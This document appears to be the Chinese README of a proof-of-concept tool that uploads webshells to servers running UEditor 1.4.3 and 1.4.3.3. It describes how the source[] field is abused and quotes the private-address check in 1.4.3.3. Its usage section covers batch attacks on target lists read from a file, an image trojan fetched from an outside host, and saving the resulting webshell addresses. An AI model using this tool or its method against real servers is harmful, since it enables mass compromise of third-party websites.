# 1. ueditorUploadPoc说明
基于python3.9版本开发，目前仅支持1.4.3和1.4.3.3版本webshell上传
+ 1.4.3没有私有地址检测，就是source[]字段，
+ 1.4.3.3会对shell address做检查，如果发现是本地环回地址、10开头地址、192.168、169.等地址都不行
+ 支持批量攻击模式，请将目标服务器地址存放在文件中(-t  target_filename指定的文件中，每行一条url)。
  ~~~aspx
    if (IPAddress.IsLoopback(myIPAddress)) return true;
    if (myIPAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
    {
        byte[] ipBytes = myIPAddress.GetAddressBytes();
        // 10.0.0.0/24 
        if (ipBytes[0] == 10)
        {
            return true;
        }
        // 172.16.0.0/16
        else if (ipBytes[0] == 172 && ipBytes[1] == 16)
        {
            return true;
        }
        // 192.168.0.0/16
        else if (ipBytes[0] == 192 && ipBytes[1] == 168)
        {
            return true;
        }
        // 169.254.0.0/16
        else if (ipBytes[0] == 169 && ipBytes[1] == 254)
        {
            return true;
        }
    }
    ~~~

# 2. 使用
~~~shell
python3.9 ueditor143Poc.py -h
usage: python3.9 [-h help[:options]] [[-q quiet[:options]]] [-t target_url] [-s image_shell]
    -h  help              打印帮助信息，不能与-q同时使用
    -q  quiet             不打印任何信息，不能与-h同时使用
    -t  target_url        目标服务器url地址(如果不指定-f file参数，必须指定该参数)
    -f  target_filename   从文件中读取目标服务器地址
    -m  image_shell       指定图片木马的地址(必须指定该参数)
    -o  out_filename      将webshell地址保存到指定的文件中

例如：
python3.9 ueditor143Poc.py -f target.txt -m http://x.x.x.x:xxxx/x.jpg -o shell.txt
~~~

# 3. 注意事项
1. 执行的过程中需要在参数后面跟参数值，不能连续指定两个参数而不给值，如：
~~~python
python3.9 ueditor143Poc.py -f -m http://x.x.x.x:xxxx/x.jpg -o shell.txt  # 会把-m识别成-f的参数值
~~~